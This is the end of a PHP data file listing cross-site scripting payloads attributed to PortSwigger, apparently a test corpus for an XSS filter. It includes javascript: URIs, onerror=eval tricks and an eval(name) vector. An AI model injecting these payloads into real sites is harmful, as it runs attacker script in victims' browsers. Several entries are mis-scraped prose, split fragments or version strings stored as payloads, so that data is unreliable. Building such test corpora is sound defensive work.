                'payload' => '<object data="javascript:alert(1)">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-864' => [
                'payload' => '<embed src="javascript:alert(1)">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-865' => [
                'payload' => '<object data=# codebase=javascript:alert(document.domain)//>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-866' => [
                'payload' => '<embed src=# codebase=javascript:alert(document.domain)//>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-867' => [
                'payload' => '<object data="#',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-868' => [
                'payload' => 'alert(1)" codebase=javascript://>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-869' => [
                'payload' => '<object data="#!',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-870' => [
                'payload' => 'alert(1)" codebase=javascript:>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-871' => [
                'payload' => '<embed src="#',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-872' => [
                'payload' => '<embed src="#!',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-873' => [
                'payload' => '<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-874' => [
                'payload' => '<svg onload="throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:\'/*\'+URL}">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-875' => [
                'payload' => '<body onload="throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:\'/*\'+location}">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-876' => [
                'payload' => '<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'&gt;&lt;image href=\'1\' onerror=\'alert(1)\' /&gt;&lt;/svg&gt;#x" /><use id=x />',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-877' => [
                'payload' => '<x onbeforescriptexecute=alert(1)><script>1</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-878' => [
                'payload' => '<x onafterscriptexecute=alert(1)><script>1</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-879' => [
                'payload' => '<script>navigation.navigate(\'javascript:alert(1)\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-880' => [
                'payload' => 'Basic context, WAF blocks <[a-zA-Z]',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-881' => [
                'payload' => 'This lab\'s injection occurs within the basic HTML context but has a length limitation of 15. Filedescriptor came up with a vector that could execute JavaScript in 16 characters: <q oncut=alert`` but can you beat it?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-882' => [
                'payload' => '<q oncut=alert``',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-883' => [
                'payload' => 'The context of this lab inside an attribute with a length limitation of 14 characters. We came up with a vector that executes JavaScript in 15 characters:"oncut=alert``+ the plus is a trailing space. Do you think you can beat it?',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-884' => [
                'payload' => '"oncut=alert``',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-885' => [
                'payload' => 'It\'s all well and good executing JavaScript but if all you can do is call alert what use is that? In this lab we demonstrate the shortest possible way to execute arbitrary code.',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-886' => [
                'payload' => '<q oncut=eval(name)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-887' => [
                'payload' => 'Again calling alert proves you can call a function but we created another lab to find the shortest possible attribute based injection with arbitrary JavaScript.',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-888' => [
                'payload' => 'We received a request from twitter about this next lab. It occurs within a frameset but before a body tag with equals filtered. You would think you could inject a closing frameset followed by a script block but that would be too easy.',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-889' => [
                'payload' => '>= 3.0.0',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-890' => [
                'payload' => '>= 3.4.0',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-891' => [
                'payload' => '<= 4.17.15',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-892' => [
                'payload' => '<= 2.0.12',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
        ];
    }
}
